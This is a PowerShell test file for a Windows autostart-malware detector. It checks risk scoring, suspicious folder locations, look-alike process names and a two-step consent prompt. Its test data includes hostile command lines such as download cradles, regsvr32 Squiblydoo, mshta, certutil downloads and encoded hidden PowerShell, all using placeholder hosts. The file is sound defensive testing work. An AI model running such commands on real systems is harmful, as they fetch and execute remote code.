# Self-test for the detection logic. Feeds synthetic command lines and paths to the
# analysers and checks the verdicts. It changes nothing on the system (the only file it
# creates is a harmless temporary .cmd in your Temp folder, which it deletes again).
#   powershell -ExecutionPolicy Bypass -File tests\Test-Detections.ps1

$root = Split-Path $PSScriptRoot -Parent
. (Join-Path $root 'src\Core.ps1')
$script:pass = 0; $script:fail = 0

function Assert([string]$Name, [bool]$Condition, [string]$Detail = '') {
    if ($Condition) { $script:pass++; Write-Host "  PASS  $Name" -ForegroundColor Green }
    else { $script:fail++; Write-Host "  FAIL  $Name  $Detail" -ForegroundColor Red }
}

function Get-TopRisk([string]$Cmd) {
    $top = 'Info'; foreach ($h in (Get-CommandLineRisk $Cmd)) { $top = Get-MaxSeverity $top $h.Severity }; $top
}

Write-Host "`n Command-line analysis" -ForegroundColor Cyan
$cases = @(
    @('powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=', 'High',   'encoded PowerShell'),
    @('powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x.example/a'')"', 'High', 'download cradle'),
    @('mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc""")',            'High',   'mshta'),
    @('regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll',                             'High',   'Squiblydoo'),
    @('rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)',                     'High',   'rundll32 javascript'),
    @('certutil -urlcache -split -f http://x.example/p.exe p.exe',                             'High',   'certutil download'),
    @('wscript.exe C:\Users\bob\AppData\Roaming\upd.vbs',                                      'Medium', 'script host'),
    @('"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window',          'Info',   'normal Chrome autostart'),
    @('C:\WINDOWS\system32\SecurityHealthSystray.exe',                                         'Info',   'normal Windows tray app')
)
foreach ($c in $cases) {
    $got = Get-TopRisk $c[0]
    Assert "$($c[2]) -> $($c[1])" ($got -eq $c[1]) "(got $got)"
}

Write-Host "`n Location analysis" -ForegroundColor Cyan
Assert 'Temp folder is risky'          ([bool](Get-LocationRisk 'C:\Users\bob\AppData\Local\Temp\x.exe'))
Assert 'Downloads is risky'            ([bool](Get-LocationRisk 'C:\Users\bob\Downloads\setup.exe'))
Assert 'Public folder is risky'        ([bool](Get-LocationRisk 'C:\Users\Public\svc.exe'))
Assert 'AppData\Roaming root is risky' ([bool](Get-LocationRisk 'C:\Users\bob\AppData\Roaming\winupd.exe'))
Assert 'Program Files is fine'         (-not (Get-LocationRisk 'C:\Program Files\App\app.exe'))
Assert 'AppData app folder is fine'    (-not (Get-LocationRisk 'C:\Users\bob\AppData\Local\Discord\app-1.0\Discord.exe'))

Write-Host "`n Command target parsing" -ForegroundColor Cyan
Assert 'quoted path'   ((Resolve-CommandTarget '"C:\Program Files\A B\x.exe" -q') -eq 'C:\Program Files\A B\x.exe')
Assert 'bare system exe resolves to System32' ((Resolve-CommandTarget 'rundll32.exe foo.dll,Bar') -like '*\System32\rundll32.exe')
Assert 'env vars expand' ((Resolve-CommandTarget '%windir%\System32\cmd.exe /c x') -like "$env:windir\System32\cmd.exe")
Assert 'unquoted path with spaces' ((Resolve-CommandTarget "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -NoP") -like '*powershell.exe')
Assert 'payload DLL found' ((Get-PayloadPath 'rundll32.exe C:\Users\Public\evil.dll,Start') -eq 'C:\Users\Public\evil.dll')

Write-Host "`n Look-alike process names" -ForegroundColor Cyan
Assert 'scvhost.exe ~ svchost.exe (swap)'    ((Get-Levenshtein 'scvhost.exe' 'svchost.exe') -eq 1)
Assert 'lsasss.exe ~ lsass.exe (extra)'     ((Get-Levenshtein 'lsasss.exe' 'lsass.exe') -eq 1)
Assert 'chrome.exe is not a look-alike'      ((Get-Levenshtein 'chrome.exe' 'svchost.exe') -gt 1)

Write-Host "`n End-to-end autostart scoring" -ForegroundColor Cyan
$tmp = Join-Path $env:TEMP "sabel-selftest-$PID.cmd"
Set-Content -LiteralPath $tmp -Value '@echo harmless self-test file' -Encoding ASCII
try {
    $m = Measure-AutoStart "`"$tmp`""
    Assert 'unsigned script in Temp -> High' ($m.Severity -eq 'High') "(got $($m.Severity): $($m.Reasons -join '; '))"
} finally { Remove-Item -LiteralPath $tmp -ErrorAction SilentlyContinue }
$m = Measure-AutoStart "`"$env:windir\explorer.exe`""
Assert 'Microsoft-signed explorer.exe -> Info' ($m.Severity -eq 'Info') "(got $($m.Severity))"
$m = Measure-AutoStart '"C:\NoSuchFolder\gone.exe" /background'
Assert 'missing target is noted' ((-not $m.Sig.Exists) -and $m.Severity -eq 'Low')
$m = Measure-AutoStart "`"$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe`" -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
Assert 'signed PowerShell with encoded command -> High' ($m.Severity -eq 'High') "(got $($m.Severity))"

Write-Host "`n Two-step consent (simulated keyboard, fake Defender - nothing is scanned or removed)" -ForegroundColor Cyan
. (Join-Path $root 'src\Report.ps1')
. (Join-Path $root 'src\Actions.ps1')
$script:ActionLog = Join-Path $env:TEMP "sabel-selftest-$PID.log"
# Fakes: these override the real functions/cmdlets for the rest of this test only.
$script:answers = New-Object System.Collections.Queue
function Read-Host([string]$Prompt) { if ($script:answers.Count) { $script:answers.Dequeue() } else { '' } }
function Test-CanAskUser { $script:fakeInteractive }
function Test-DefenderAvailable { $true }
function Start-MpScan { $script:scanCalls++ }
function Show-NewDetections { }
function Write-Host { }   # keep the test output tidy
$probe = $PSCommandPath   # an existing file to "scan"

$cases = @(
    @($true,  @('y', 'CONFIRM'),  1, 'yes + CONFIRM runs the action'),
    @($true,  @('n'),             0, 'answering no at step 1 cancels'),
    @($true,  @(''),              0, 'just pressing Enter cancels (default is No)'),
    @($true,  @('y', 'yes'),      0, 'step 2 needs the word CONFIRM, not yes'),
    @($true,  @('y', ''),         0, 'Enter at step 2 cancels'),
    @($false, @('y', 'CONFIRM'),  0, 'no person at the keyboard -> refused even with answers')
)
foreach ($c in $cases) {
    $script:fakeInteractive = $c[0]; $script:scanCalls = 0
    $script:answers.Clear(); foreach ($a in $c[1]) { $script:answers.Enqueue($a) }
    Invoke-DefenderFileScan $probe
    Remove-Item Function:\Write-Host -ErrorAction SilentlyContinue
    Assert $c[3] ($script:scanCalls -eq $c[2]) "(Defender called $script:scanCalls times)"
    function Write-Host { }
}
Remove-Item Function:\Write-Host -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $script:ActionLog -ErrorAction SilentlyContinue

Write-Host ""
$color = if ($script:fail) { 'Red' } else { 'Green' }
Write-Host "  $script:pass passed, $script:fail failed" -ForegroundColor $color
if ($script:fail) { exit 1 }
